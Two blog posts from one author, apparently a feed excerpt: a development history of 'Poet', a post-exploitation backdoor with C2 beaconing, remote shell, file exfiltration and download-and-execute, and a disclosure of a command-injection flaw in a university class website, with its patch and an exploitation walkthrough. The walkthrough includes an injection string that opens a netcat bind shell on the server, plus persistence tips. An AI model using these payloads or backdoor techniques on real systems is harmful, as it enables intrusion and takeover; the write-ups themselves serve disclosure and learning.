    <content type="html"><![CDATA[<h3>Introduction</h3>

<p>For the past eight months or so, I&rsquo;ve been working sporadically on a side
project of mine I call <a href="http://github.com/mossberg/poet">Poet</a>. Poet is
basically a tool for hackers that&rsquo;s useful for post exploitation, that is,
<em>after</em> you&rsquo;ve initially exploited and gotten access to the computer you&rsquo;re
not supposed to have access to. Poet is useful because it essentially acts as
a backdoor you can install into a system to help you maintain access once
you&rsquo;ve gotten your foot in the door.</p>

<p>As a disclaimer, I am building Poet purely for my own education and learning experience.
The code is freely available because I think it might be useful to others interested
in learning about this sort of thing. Use it responsibly.</p>

<p>I&rsquo;ve learned a lot during the process of
building this tool and I thought it would be cool to write a blog post (possibly
more to come)
documenting that process.</p>

<h3>Motivation</h3>

<p>The initial motivation for this project came from an experience I had
participating in the 2014 Northeast Collegiate Cyber Defense Competition. In
short, the competition requires a team of students to protect a small
business IT infrastructure from a red team of hackers. Usually the red team
is really good and completely owns you at some point or other throughout
the competition, and at the end they tell you what they did and give
you tips on how to improve. In particular, the red team told us that there
was pre-installed &ldquo;beaconing&rdquo; malware on many of our systems from the start
of the competition that would &ldquo;phone home&rdquo; to a command and control (C2) server
every once in a while to get commands and tasks to execute on the target
system. This idea was pretty interesting to me, and a basic implementation
didn&rsquo;t actually seem <em>too</em> hard to write, so I decided to give it a try, even
though at this point, I had no experience with network programming.</p>

<!-- more -->


<h3>v0.1</h3>

<p>The first version of Poet was drastically different from the current form
and was just about as simple and primitive as it gets for something
like this. In this version, the client program (executed on target) would
repeatedly attempt to connect to a socket (port 80 by default) on the server (attacker&rsquo;s C2 server)
at a specified interval. If the connection failed (server
wasn&rsquo;t running), the client would sleep, otherwise it would execute
a command sent from the server, sending back the stdout of the command.
The
server simply maintained a queue of commands to execute and would one
by one pop them off the queue and send them to the client, printing out the stdout
when it came back.
This was a great exercise
to learn the basics of socket programming, but of course
wasn&rsquo;t very useful at all, for a number of reasons. First, ideally the client&rsquo;s
interval is very large so as to minimize network use and
remain stealthy but that puts a hard limit on the rate at which
commands can be executed. This system was also very inflexible because there
was no way to reorder or edit commands in the queue, since the &ldquo;user
interface&rdquo; was just a server script that was run with the commands to execute
as arguments. Overall, a good start,
but there was definitely much work ahead to actually make this a semi-realistic tool.</p>

<h3>v0.2</h3>

<p>The second version of Poet involved a pretty substantial redesign although
one of the things to stay the same would be the high
level client/server beaconing dynamic. This is far superior than having the
client attempt to listen on the target&rsquo;s end because in any sort of &ldquo;real&rdquo;
scenario, the target will likely be behind a firewall that will reject
incoming packets on arbitrary ports.
The beaconing model will allow the tool
to bypass most standard firewalls that aren&rsquo;t specifically targeting it because
outbound port 80 traffic is almost certainly
allowed. I later changed the default port to 443 because it&rsquo;s just as
likely to be allowed out and because it could potentially avoid packet inspection,
since traffic on 443 is usually encrypted.</p>

<p>Building on top of this model, there were a couple other brainstorms I had
to build on top of v0.1. Instead of executing a single command for every ping,
what about sending over multiple commands? What about a pastebin/gist URL to
a script that the client
would download and execute? These would help solve the rate limit problem
because an arbitrary number of commands, instead of one, could be executed
for each ping. What about user interface?
What about creating an actual web user interface
for managing the command queue that the client was pulling from each ping?
This would help solve the flexibility problem.</p>

<p>While these would be relatively simple to add to v0.1,
if I asked myself, &ldquo;If I were a hacker, would I
want to use this tool?&rdquo; the answer would be &ldquo;No way!&rdquo; because I would only be able
to interact with my target system via discrete scripts, and I
would have to wait the ideally large time interval between pings to
get any sort of feedback on my actions.</p>

<p>This made it obvious that I would have to move
from a design where each ping from the client was an opportunity for the
user to run <em>x</em> actions on the target,
to a design where each ping from
the client was an opportunity for the user to interactively control the client
for an unlimited time,
and perform actions on the target with continuous feedback.
With this in mind, I opted to use a shell as the user interface on the server
side since it seemed simpler to implement and I was more familiar with
implementing a shell versus something like a web interface (which would
likely have to have a shell built into it anyway for executing commands).
The server design would be similar to that of v0.1 in that the server would
only be running when the user wanted to control the client, and the client
would use the inability to connect to the server as an sign to &ldquo;go to sleep&rdquo;
for another interval, although this isn&rsquo;t strictly necessary. Another server design
I thought of would be an always-on model where the server would always answer
the client&rsquo;s ping with some kind of binary state value, which would work equally
well, but wouldn&rsquo;t be strictly necessary because state can be inferred as
described above.</p>

<p>In designing the actual protocol the client
and server use to communicate, I decided to
use HTTP to mildly obfuscate the client&rsquo;s initial check if
the server is running. The client&rsquo;s ping consists of a
GET request for <code>/style.css</code> on the server <sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup>. Of course, the server isn&rsquo;t
a real web server, but it temporarily masquerades as one for the purposes of
the initial handshake and sends back a hardcoded HTTP response of some random
css file, and launches the control shell for the user. At this point, the
protocol used is as simple as it gets: size of the following data + the data
itself. This being my first time doing socket programming, my implementation
was a little weird and reserved the first five bytes of the data sent over the
wire for the ASCII decimal representation of the size (<code>¯\_(ツ)_/¯</code>), but
hey, it worked.</p>

<p>The majority of the work left for v0.2 was essentially deciding on the features
that the control shell would have and implementing the &ldquo;userland utilities&rdquo;
or commands you could run at the shell. The commands I thought of and implemented
were:</p>

<ul>
<li><code>exec</code>: This was the first command I wrote. It executes one or more commands on
the target, sending the stdout of all of them back in one big chunk of text. I later
added a flag that would save the big chunk to a file in the archive directory.
Useful for stuff like grabbing process dumps.</li>
<li><code>recon</code>: Basically like <code>exec</code>, but the commands are pre-selected and are tailored
towards &ldquo;reconnaissance&rdquo; purposes. Stuff like <code>whoami</code>, <code>id</code>, <code>uname -a</code>, <code>w</code>, etc.</li>
<li><code>shell</code>: Launches an actual remote shell on the target (inside the original
control shell). Was implemented
really crudely in this version with the execution backend on the client simply
being something like</li>
</ul>


<pre><code class="python">subprocess.Popen(cmd, stdout=sp.PIPE, stderr=sp.STDOUT, shell=True).communicate()[0]
</code></pre>

<ul>
<li><code>exfil</code>: Exfiltrate files and saves to the archive directory. Pretty standard.
Current implementation is pretty crude, and loads entire file into memory, rather
than paging the data somehow.</li>
<li><code>selfdestruct</code>: Exit the client and delete script on disk. Without this,
the user would have to do something weird (nay, treasonous?) like
killing the client&rsquo;s process from its own remote shell to completely
turn off the client.</li>
<li><code>dlexec</code>: Download an executable from the internet and execute it. Also
pretty standard, useful for upgrading or installing additional tools on target</li>
<li><code>exit</code>: Pretty self explanatory, this tells the client that the server&rsquo;s
done for now and that the client can now go back to sleep and begin pinging
again in one time interval.</li>
</ul>


<p>This work resulted in a decently functional prototype that could feasibly
be used for post-exploitation.</p>

<h3>v0.3</h3>

<p>Version 0.3 was a pretty arbitrary decision, but mostly involved significant
refactoring of the backend code, with a couple new user facing features.
One notable change was the refactoring of the entire codebase from imperative,
C-style programming to object oriented style, which gave the code much better
structure. The communications protocol was also slightly refactored to be
more standard by reserving the first four bytes for
the binary data size value which simultaneously conserved
bytes sent over the wire and increased the maximum data that could be sent in
one message between client and server. An additional shell command I implemented
was called <code>chint</code>, standing for &ldquo;change interval&rdquo;, which lets the server
change the client&rsquo;s ping delay interval after the client&rsquo;s been started.</p>

<p>All that&rsquo;s great, but the most significant set of improvements in my opinion
were related to fleshing out the remote shell feature. While it &ldquo;worked&rdquo;
to a decent degree for most standard commands there were two main problems with
it that kept it from being a &ldquo;real&rdquo; shell. For reference, here&rsquo;s what the code
looked like for executing commands in v0.2.</p>

<pre><code class="python">def cmd_exec(cmd):
    return sp.Popen(cmd, stdout=sp.PIPE, stderr=sp.STDOUT,
                    shell=True).communicate()[0]
</code></pre>

<p>For those that aren&rsquo;t as familiar with Python&rsquo;s <code>subprocess</code> library, this
executes an arbitrary command line (<code>cmd</code>), sending the stderr to the stdout,
and returns any stdout of the command.</p>

<p>The first problem was that the shell
output was not continuous &ndash; when executing a command like <code>ls -R /</code>, which
typically results in lots of scrolling output in a normal terminal, my remote
shell would instead block on the server end while the client executed the
command to its completion and sent over the entire stdout as one big piece.
I solved this problem by adapting the code to continuously poll the
stdout file descriptor for new lines of output, sending those over individually
so that the server would get each line of output as soon as it was available.</p>

<p>The second problem was that if certain commands like <code>ping</code> were executed in the shell,
the client would effectively become unusable because <code>ping</code> (when executed
without the <code>-c</code> parameter) is usually ended by being sent a INT signal (SIGINT),
typically by hitting Ctrl-C on the keyboard. The problem is, the client side
had no mechanism to receive signals and send them to the running process, so
it would be eternally running this unending process and the user
would totally lose control of the target. To solve this problem, I needed a way for the
client to simultaneously execute the requested command, <strong>and</strong> listen for
messages from the server, presumably telling the client to end the running
process. To do this, I learned to use the <code>select()</code> function which is an
easy way for an application to multiplex data streams (in this case,
the stdout of the running process, and the socket connection to the server)
and process their data without requiring concurrency at the application
level.</p>

<p>The resulting code from these two fixes is below. Select takes in multiple
file descriptors (File objects in Python) and returns which ones
are readable (in this example). After it returns, I can check which file descriptors
it returned, and proceed accordingly. In the expected case where
we can read from the process&rsquo;s stdout file descriptor, we get a line of
stdout from the process, forwarding it to the server immediately.
In the exceptional case where we can read from the socket, we receive the message,
making sure it contains the proper keyword to end the process (&lsquo;shellterm&rsquo;)
and terminating the process if it does.</p>

<pre><code class="python">proc = sp.Popen(inp, stdout=sp.PIPE, stderr=sp.STDOUT, shell=True)
while True:
    readable = select.select([proc.stdout, s.s], [], [], 30)[0]
    for fd in readable:
        if fd == proc.stdout:  # proc has stdout/err to send
            output = proc.stdout.readline()
            if output:
                s.send(output)
            else:
                return
        elif fd == s.s:  # remote signal from server
            sig = s.recv()
            if sig == 'shellterm':
                proc.terminate()
                return
</code></pre>

<p>That&rsquo;s all for v0.3. Again, the v0.3 decision was pretty arbitrary and I ultimately
chose to ship it because all the other features I had lined up at
the time were
more labor intensive/experimental and I <em>really</em> wanted to get my fancy
new remote shell into master :D.</p>

<h3>Future Work</h3>

<p>At this point, I&rsquo;m pretty satisfied with the state of the project, but as
always, there&rsquo;s more work to be done. Here are some future features/ideas/improvements
that may or may not ever get implemented:</p>

<ul>
<li><strong>crypto</strong>: If anything, I&rsquo;d say encrypted communications are the one thing
keeping this from being a really usable tool. Right now, communications are
sent in the clear essentially, although they are base64 encoded for the slightest
amount of obfuscation. Ideally I&rsquo;d use Python&rsquo;s ssl library, probably doing
something like hardcoding a server public key into the client. A solution
that wouldn&rsquo;t be as much work, but only slightly more secure than the current
cleartext communications would be to use a basic xor cipher which would be
pretty easy to write, and force an analyst to retrieve the key from memory,
or the initial exchange over the network, depending on how I chose to implement it.</li>
<li><strong>protocol improvement</strong>: This shouldn&rsquo;t actually be too hard to implement,
but the data section of a poet message is typically some type of keyword, a space,
then any relevant data. For example, to start a shell, the server sends
over &ldquo;shell&rdquo;, to get recon data, the server sends &ldquo;recon&rdquo;, for an <code>exec</code>
command, the server sends over &ldquo;exec&rdquo; followed by the commands to execute.
Instead of using these string keywords, it would be possible to move them into
the protocol as a single byte after the data size and have some sort
of lookup table for referencing the appropriate action to each key.</li>
<li><strong>interval fuzzing</strong>: Instead of having a strict, predictable delay time
interval for client pings, I could implement some sort of fuzzing so that the delay
time is slightly variable for further obfuscation
purposes.</li>
</ul>


<p>and last, but not least&hellip;</p>

<ul>
<li><strong>botnet</strong>(?!): Now that I more or less have the infrastructure down for
controlling a single client, it would be pretty cool to
fork the project and adapt it for a more distributed design with multiple
clients connecting to the server, all receiving commands to execute.</li>
</ul>


<hr />

<p>Again, all the code for this project is available on <a href="http://github.com/mossberg/poet">github</a>.
Hopefully this was interesting/helpful for some people, and as always thanks for reading!</p>

<hr/>
<ol>
<li id="fn:1">
<p>Writing this post and thinking about this again actually helped me discover a bug in the server where the server would terminate if it happened to receive a non-client HTTP request while waiting for the client. This would enable a third party that wanted to mess with the Poet user to spam the Poet user&rsquo;s machine with HTTP requests (assuming they knew the proper port to send to) at any interval smaller than the Poet interval, and effectively DOS Poet.<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>

    <content type="html"><![CDATA[<p><em>Discovering, patching, and exploiting a simple command injection webapp</em></p>

<h2>Introduction</h2>

<p>The university that I study at, <a href="http://neu.edu">Northeastern</a> has an awesome <a href="http://www.northeastern.edu/entrepreneurs/">Entrepreneurs Club</a>. One of the programs that they run is called <a href="http://www.northeastern.edu/entrepreneurs/programs/imadeit/">iMadeIT</a> which is a series of workshops designed to help entrepreneurs with a nontechnical background to learn about web development. This post is going go over a vulnerability I discovered in the iMadeIT class website, how I patched, and how an attacker might exploit it in a real situation.</p>

<h2>Background</h2>

<p>The workshops are taught using <a href="http://flask.pocoo.org/">Flask</a>, a Python microframework for web development known for its simplicity and ease of use for beginners. Students taking the class would sign up at <a href="http://imadeit.nu">imadeit.nu</a>, which would make them an account on the website for class management purposes, but also would interestingly create an account for them on the server running the iMadeIT site as well as allow them to &ldquo;register&rdquo; a TCP port to run their Flask app on. This would allow students to have a live link on the internet so they could show off what they&rsquo;ve been working on to people (instead of just running on localhost) without requiring everyone to have their own server.</p>

<h2>The Vulnerability</h2>

<p>Anyway, the iMadeIT guys open sourced the <a href="https://github.com/imadeitnortheastern/spring2014">code</a> that runs their imadeit.nu website and since it is actually written in Flask which is something I&rsquo;ve been meaning to learn for a while now, I decided to take a look at it to see if I could understand anything.</p>

<p>After poking around in the code for a bit, I noticed this particularly interesting function:</p>

<pre><code class="python">def create(name, password):
    {...}
    return os.system('useradd -p {} -s /bin/bash -d /home/{} -m {}'.format(enc_pass, name, name))
</code></pre>

<p>This is what gives the user their own account on the server. If we trace the function calls, we can see that this function is called from the <code>create_account</code> function. Heavily edited to only show relevant sections, it looks like this:</p>

<pre><code class="python">def create_account():
    {...}
    name = request.form['create_username']
    pw = request.form['create_pw']
    {...}
    user.create(name, pw)
    {...}
</code></pre>

<p>Notice anything? The username is taken from the webpage form and directly passed into the <code>create</code> function without any type of sanitization, creating a classic <a href="https://www.owasp.org/index.php/Command_Injection">command injection</a> vulnerability. What this essentially means is that it&rsquo;s possible for an attacker to put a specially formatted string in the username field that will allow them to execute arbitrary commands on the server.</p>

<p>For example, under ordinary circumstances, a user might enter &ldquo;mark&rdquo; as their username, so the <code>os.system()</code> call would execute:</p>

<pre><code class="sh">useradd -p {encrypted password} -s /bin/bash -d /home/mark -m mark
</code></pre>

<p>Let&rsquo;s say a user entered &ldquo;mark; ls -l #&rdquo;. Now, <code>os.system()</code> is going to execute:</p>

<pre><code class="sh">useradd -p {encrypted password} -s /bin/bash -d /home/mark; ls -l; # -m mark; ls -l #
</code></pre>

<p>This will create the user &ldquo;mark&rdquo;, but it will also cause <code>ls -l</code> to be executed, which will list the files in the directory. Now the user that entered this in the form isn&rsquo;t going to see anything; the command executes internally on the server. Hopefully you&rsquo;re seeing now why this is bad - anyone can execute any command on the server as the user that is running the Flask app. In this case it&rsquo;s particularly bad, because the app is running on port 80 of the server which is a &ldquo;privileged&rdquo; port. Since only the superuser is allowed to run network services on ports below 1024, essentially anyone now has root access to the server.</p>

<p>As a side note, the &ldquo;#&rdquo; in the injection is there to comment out the rest of the command (the &ldquo;-m&rdquo; part) so it doesn&rsquo;t interfere with the injection.</p>

<h2>Patching</h2>

<p>This is actually a really easy vulnerability to protect against, all that&rsquo;s required is to make sure that that the username and password fields are checked in some form before they are sent to the system call. In this case, we don&rsquo;t have to worry about the password, because it goes through encryption before being used in the system call, so any attempts to inject in the password field would fail when the attacker&rsquo;s injection gets encrypted.</p>

<p>To check the username input, it&rsquo;s important to use a <a href="https://www.owasp.org/index.php/Positive_security_model">positive security model</a> (a whitelist) over a negative one. This is because using a blacklist of specific characters that aren&rsquo;t allowed can be potentially incomplete and leaves the attacker room to find sneaky ways to exploit this vulnerability using alternative characters that aren&rsquo;t in your blacklist. As a general rule, it&rsquo;s better to use a whitelist of only the characters that are permitted. In this case, for a username, let&rsquo;s say that users should only be allowed to have usernames with lowercase letters, uppercase letters, underscores, and periods. Writing a function to check for this would look like this:</p>

<pre><code class="python">import re
def valid_username(name):
    if re.search('[^\w.]', name):
        return False
    else
        return True
</code></pre>

<p>In this particular approach, we aren&rsquo;t <em>really</em> sanitizing the input, we&rsquo;re just checking it&rsquo;s validity. In this case, if this function returned false, the <code>create_account</code> function would fail, and we would show an error to the user. An alternative would be to attempt to correct invalid user input by removing invalid characters, however despite potential UX arguments, I think it&rsquo;s personally better just to halt completely and let the user sort it out on their end.</p>

<h3>Exploiting</h3>

<p>Now that we&rsquo;ve described how the vulnerability works, and how to protect against it, let&rsquo;s dirty our white hats a little and check out some steps an attacker might take once discovering the vulnerability.</p>

<p>First of all, we know that we can execute arbitrary commands on the server as the root user. To most, this pretty much is already the definition of being 0wned. However, doing so is sort of awkward; we have to go to the login form and create a new user for every command we want to execute. Let&rsquo;s use netcat to create a rudimentary backdoor into the system by telling netcat to listen on an arbitrary port (say, 1337) and executing a certain file upon receiving a connection (say, <code>/bin/sh</code>).</p>

<p>This command looks like</p>

<pre><code class="sh">$ netcat -l -p 1337 -e /bin/sh
</code></pre>

<p>and so our injection would look like</p>

<pre><code class="sh">mark; netcat -l -p 1337 -e /bin/sh &amp; #
</code></pre>

<p>Notice that I added a &ldquo;&amp;&rdquo; before the &ldquo;#&rdquo; in the injection. This will cause the backdoor to run in the background because otherwise the flask process would stop while the backdoor is running, and the webapp would stop working. Not very stealthy. When we enter this into the create account form, we won&rsquo;t get any sort of confirmation that our backdoor is working, however we&rsquo;ll know soon enough when we test it. To connect, all we need to do is run</p>

<pre><code>$ netcat [ip address] 1337
</code></pre>

<p>which will attempt to create a simple TCP connection to the IP address of the server on the same port you specified earlier. If it worked, you won&rsquo;t get a prompt, but you&rsquo;ll have a shell that you can enter commands at. With spaces added for ease of reading, this looks like</p>

<pre><code>$ netcat 1.2.3.4 1337

ls
imadeit.db
imadeit.py
schema.sql
static
templates
user.py
user.pyc

whoami
root

echo $SHELL
/bin/bash
</code></pre>

<p>Now, the server has been totally owned. Next steps could include adding your ssh public key to the <code>~/.ssh/authorized_keys</code> file for enhanced persistence if the server got restarted, or if someone saw your backdoor and killed it. In a situation where the app wasn&rsquo;t running on port 80 and was running on a nonprivileged port instead, you wouldn&rsquo;t necessarily have root access so you would then use a local exploit to escalate privileges. However for this situation, even exploiting this vulnerability at all is sort of pointless because the webapp actually <em>creates an account for you</em> on the server which you can ssh into, and legitimately get a shell.</p>

<h2>Conclusion</h2>

<p>I hope you can see now how even something as simple as checking user input in a webapp can go a long way in securing your web site and making sure you don&rsquo;t get hacked. After discovering the vuln, I submitted a pull request to iMadeIT&rsquo;s repo on github, which was merged and deployed an astonishing <a href="https://github.com/imadeitnortheastern/spring2014/pull/1"><em>5 minutes</em></a> later, so serious props to them for that. I&rsquo;ve never discovered a serious vulnerability &ldquo;in the wild&rdquo; before, so it was sort of cool to go through the process of submitting the patch and then confirming that it was working in the live site.</p>

<p>That&rsquo;s all, thanks for reading!</p>
